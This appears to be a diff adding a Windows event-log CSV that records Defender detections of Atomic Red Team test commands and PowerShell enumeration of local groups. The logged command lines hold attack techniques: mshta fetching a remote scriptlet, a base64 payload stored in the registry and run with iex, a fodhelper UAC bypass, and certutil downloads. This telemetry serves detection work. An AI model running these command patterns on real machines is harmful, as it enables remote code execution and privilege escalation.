+ 	Action Status:  No additional actions required
+ 	Error Code: 0x00000000
+ 	Error description: The operation completed successfully. 
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Information,15/04/2020 14:46,Microsoft-Windows-Windows Defender,1117,None,"Windows Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Kovter.L&threatid=2147752413&enterprise=0
+ 	Name: Trojan:Win32/Kovter.L
+ 	ID: 2147752413
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c CMD_EXECUTABL /c MSHTA_EXECUTABLE javascript:a=GetObject('script:GITHUB_ATOMICS_T1086').Exec();close()
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Action: Remove
+ 	Action Status:  No additional actions required
+ 	Error Code: 0x00000000
+ 	Error description: The operation completed successfully. 
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Information,15/04/2020 14:46,Microsoft-Windows-Windows Defender,1117,None,"Windows Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Powessere.K&threatid=2147734747&enterprise=0
+ 	Name: Trojan:Win32/Powessere.K
+ 	ID: 2147734747
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe & {# Encoded payload in next command is the following ""Set-Content -path ""$env:ART-MAKER_TEXT"" -value ""Hello from the Atomic Red Team"""" REG_EXECUTABLE add ""HKEY_AtomicRedTeam"" /v ART /t REG_SZ /d ""HASH="" iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU_SOFTWARE).ART)))}
+reg.exe add ""HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam"" /v ART /t REG_SZ /d ""U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=""
+iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))}
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Action: Remove
+ 	Action Status:  No additional actions required
+ 	Error Code: 0x00000000
+ 	Error description: The operation completed successfully. 
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Information,15/04/2020 14:46,Microsoft-Windows-Windows Defender,1117,None,"Windows Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Sobocat.A&threatid=2147733729&enterprise=0
+ 	Name: Trojan:Win32/Sobocat.A
+ 	ID: 2147733729
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c REG_EXECUTABLE add HCU_SOFTWARE /ve /d CMD>EXE /f & reg.exe add HCU_SOFTWARE  /v DelegateExecute & FODHELPER_EXECUTABLE
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Action: Remove
+ 	Action Status:  No additional actions required
+ 	Error Code: 0x00000000
+ 	Error description: The operation completed successfully. 
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Information,15/04/2020 14:46,Microsoft-Windows-Windows Defender,1117,None,"Windows Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Ceprolad.A&threatid=2147726914&enterprise=0
+ 	Name: Trojan:Win32/Ceprolad.A
+ 	ID: 2147726914
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c type EVIL_EXECUTABLE > TeamViewer12_Logfile EVIL_EXECUTABLE & extrac32 PROCEXSP_EXECUTABLE & findstr /V /L W3AllLov3DonaldTrump PROCEXSP_EXECUTABLE > PROCEXSP_EXECUTABLE & certutil_executable -urlcache -split -f GITHUB_ATOMICS_T1096 c:\temp:ttt & makecab AUTORUNS_EXECUTABLE & print /D AUTORUNS_EXECUTABE & reg export EVILREG REGFILE_REG & regedit /E REGFILE_REG HKEY_CURRENT_USER\MyCustomRegKey & expand WEBDAV_BAT FILE_BAT & ESENTULT_EXECUTABLE /y AUTORUNS_EXECUTABLE /d AUTORUNS_EXECUTABLE /o
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Action: Remove
+ 	Action Status:  No additional actions required
+ 	Error Code: 0x00000000
+ 	Error description: The operation completed successfully. 
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Warning,15/04/2020 14:46,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Ceprolad.A&threatid=2147726914&enterprise=0
+ 	Name: Trojan:Win32/Ceprolad.A
+ 	ID: 2147726914
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c cmd /c certutil -urlcache -split -f GITHUB_ATOMIC_RED_TEAM Atomic-license.txt
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Warning,15/04/2020 14:46,Microsoft-Windows-DistributedCOM,10016,None,"The machine-default permission settings do not grant Local Activation permission for the COM Server application with CLSID 
+{C2F03A33-21F5-47FA-B4BB-156362A2F239}
+ and APPID 
+{316CDED5-E4AE-4B15-9113-7055D84DCC97}
+ to the user DESKTOP-P8HTU4V\User SID (S-1-5-21-887719237-3143055800-1059174887-1001) from address LocalHost (Using LRPC) running in the application container Microsoft.Windows.ShellExperienceHost_10.0.18362.387_neutral_neutral_cw5n1h2txyewy SID (S-1-15-2-155514346-2573954481-755741238-1654018636-1233331829-3075935687-2861478708). This security permission can be modified using the Component Services administrative tool."
+Information,15/04/2020 14:46,SecurityCenter,15,None,Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.
+Information,15/04/2020 14:46,SecurityCenter,15,None,Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.
+Warning,15/04/2020 14:47,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Kovter.L&threatid=2147752413&enterprise=0
+ 	Name: Trojan:Win32/Kovter.L
+ 	ID: 2147752413
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c <MSHTA_EXECUTBLE> javascript:a=(GetObject('script:<ATOMIC_RED_DOMAIN>T1170_mshta.sct')).Exec();close();
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Warning,15/04/2020 14:47,Microsoft-Windows-DistributedCOM,10016,None,"The machine-default permission settings do not grant Local Activation permission for the COM Server application with CLSID 
+{C2F03A33-21F5-47FA-B4BB-156362A2F239}
+ and APPID 
+{316CDED5-E4AE-4B15-9113-7055D84DCC97}
+ to the user DESKTOP-P8HTU4V\User SID (S-1-5-21-887719237-3143055800-1059174887-1001) from address LocalHost (Using LRPC) running in the application container Microsoft.Windows.ShellExperienceHost_10.0.18362.387_neutral_neutral_cw5n1h2txyewy SID (S-1-15-2-155514346-2573954481-755741238-1654018636-1233331829-3075935687-2861478708). This security permission can be modified using the Component Services administrative tool."
+Information,15/04/2020 14:47,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Access Control Assistance Operators
+	Group Name:		Access Control Assistance Operators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xbe0
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:47,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Administrators
+	Group Name:		Administrators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xbe0
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:47,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Backup Operators
+	Group Name:		Backup Operators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xbe0
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:47,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Cryptographic Operators
+	Group Name:		Cryptographic Operators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xbe0
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:47,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Device Owners
+	Group Name:		Device Owners
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xbe0
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:47,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Distributed COM Users
+	Group Name:		Distributed COM Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xbe0
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:47,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Event Log Readers
+	Group Name:		Event Log Readers
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xbe0
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:47,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Guests
+	Group Name:		Guests
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xbe0
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:47,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Hyper-V Administrators
+	Group Name:		Hyper-V Administrators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xbe0
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:47,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\IIS_IUSRS
+	Group Name:		IIS_IUSRS
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xbe0
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:47,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Network Configuration Operators
+	Group Name:		Network Configuration Operators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xbe0
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:47,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Performance Log Users
+	Group Name:		Performance Log Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xbe0
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:47,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+"
